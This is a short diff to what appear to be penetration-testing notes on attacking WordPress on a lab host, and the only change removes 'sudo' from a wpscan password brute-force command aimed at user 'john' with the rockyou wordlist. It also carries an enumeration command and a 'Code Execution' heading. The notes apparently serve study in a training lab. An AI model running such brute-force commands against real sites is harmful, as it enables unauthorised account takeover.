@@ -21,7 +21,7 @@ wpscan --url http://blog.inlanefreight.local --enumerate u,ap,at,cb,dbe --plugin
 Login Bruteforce:
 
 ```bash
-sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 ```
 
 Code Execution:
